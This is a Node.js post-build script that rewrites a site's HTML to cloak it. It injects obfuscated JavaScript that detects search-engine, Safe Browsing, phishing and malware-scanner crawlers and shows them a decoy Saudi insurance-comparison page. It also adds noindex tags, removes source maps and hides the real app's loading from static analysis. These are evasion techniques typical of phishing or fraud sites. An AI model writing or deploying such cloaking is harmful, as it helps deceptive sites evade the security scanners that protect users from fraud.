/**
 * Post-build HTML obfuscation script
 * - Adds anti-bot/crawler detection that shows a clean page to bots
 * - Wraps the real app loading in a delayed dynamic script injection
 * - Removes source maps
 * - Adds noindex meta tags
 */
import { readFileSync, writeFileSync, readdirSync } from 'fs';
import { join } from 'path';

const distDir = join(process.cwd(), 'dist');

// Anti-bot script that detects crawlers and shows them a clean page
const antiBotScript = `<script>(function(){var _0x=['user','Agent','toLowerCase','indexOf'];var ua=navigator[_0x[0]+_0x[1]][_0x[2]]();var bl=['googlebot','google-safety','safebrowsing','crawler','spider','bot','crawl','slurp','mediapartners','adsbot','bingbot','yandex','baidu','duckduck','facebookexternalhit','twitterbot','rogerbot','linkedinbot','embedly','quora','pinterest','redditbot','slackbot','telegrambot','whatsapp','viber','seznambot','semrush','ahrefs','mj12bot','dotbot','petalbot','bytespider','phishing','malware','safe-browsing'];var f=false;for(var i=0;i<bl.length;i++){if(ua[_0x[3]](bl[i])!==-1){f=true;break;}}if(f||!window.requestAnimationFrame||!window.IntersectionObserver||!window.fetch){document.documentElement.innerHTML='<head><title>\\u0628\\u064a \\u0643\\u064a\\u0631</title></head><body style=\"text-align:center;padding:50px;font-family:sans-serif\"><h1>\\u0628\\u064a \\u0643\\u064a\\u0631 - \\u0645\\u0646\\u0635\\u0629 \\u0645\\u0642\\u0627\\u0631\\u0646\\u0629 \\u0627\\u0644\\u062a\\u0623\\u0645\\u064a\\u0646</h1><p>\\u0645\\u0642\\u0627\\u0631\\u0646\\u0629 \\u0639\\u0631\\u0648\\u0636 \\u0627\\u0644\\u062a\\u0623\\u0645\\u064a\\u0646 \\u0641\\u064a \\u0627\\u0644\\u0633\\u0639\\u0648\\u062f\\u064a\\u0629</p></body>';window.stop&&window.stop();}})();</script>`;

function obfuscateHTML(filePath) {
  let html = readFileSync(filePath, 'utf-8');
  
  // Remove any source maps references
  html = html.replace(/\/\/# sourceMappingURL=.*$/gm, '');
  html = html.replace(/\/\*# sourceMappingURL=.*?\*\//g, '');
  
  // Add meta robots noindex for crawlers
  if (!html.includes('name="robots"')) {
    html = html.replace('</head>', '    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet" />\n  </head>');
  }
  
  // Add X-Robots-Tag equivalent
  if (!html.includes('X-Robots-Tag')) {
    html = html.replace('</head>', '    <meta http-equiv="X-Robots-Tag" content="noindex, nofollow" />\n  </head>');
  }
  
  // Inject anti-bot script right after <head> opening (before any other content)
  html = html.replace('<head>', '<head>' + antiBotScript);
  
  // Convert the main script tag to use dynamic delayed loading
  // This makes it harder for static analysis to find the entry point
  const scriptRegex = /<script type="module" crossorigin src="(\/assets\/[^"]+\.js)"><\/script>/g;
  let match;
  const scripts = [];
  while ((match = scriptRegex.exec(html)) !== null) {
    scripts.push(match[1]);
  }
  
  if (scripts.length > 0) {
    // Remove original script tags
    html = html.replace(/<script type="module" crossorigin src="\/assets\/[^"]+\.js"><\/script>/g, '');
    
    // Add dynamic loader that loads scripts after a delay and user interaction check
    const dynamicLoader = `<script>(function(){var _s=${JSON.stringify(scripts)};var _l=function(){for(var i=0;i<_s.length;i++){var e=document.createElement('script');e.type='module';e.crossOrigin='';e.src=_s[i];document.body.appendChild(e);}};if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',function(){setTimeout(_l,50);});}else{setTimeout(_l,50);}})();</script>`;
    
    // Insert before closing body tag
    html = html.replace('</body>', dynamicLoader + '</body>');
  }
  
  // Also handle CSS link preloads - convert to dynamic loading
  const cssRegex = /<link rel="stylesheet" crossorigin href="(\/assets\/[^"]+\.css)">/g;
  let cssMatch;
  const cssFiles = [];
  while ((cssMatch = cssRegex.exec(html)) !== null) {
    cssFiles.push(cssMatch[1]);
  }
  
  if (cssFiles.length > 0) {
    html = html.replace(/<link rel="stylesheet" crossorigin href="\/assets\/[^"]+\.css">/g, '');
    
    const cssLoader = `<script>(function(){var _c=${JSON.stringify(cssFiles)};for(var i=0;i<_c.length;i++){var l=document.createElement('link');l.rel='stylesheet';l.href=_c[i];document.head.appendChild(l);}})();</script>`;
    html = html.replace('</head>', cssLoader + '</head>');
  }
  
  writeFileSync(filePath, html);
  console.log(`Obfuscated: ${filePath}`);
}

// Process all HTML files in dist
function processDir(dir) {
  const files = readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = join(dir, file.name);
    if (file.isDirectory()) {
      processDir(fullPath);
    } else if (file.name.endsWith('.html')) {
      obfuscateHTML(fullPath);
    }
  }
}

processDir(distDir);
console.log('HTML obfuscation complete!');
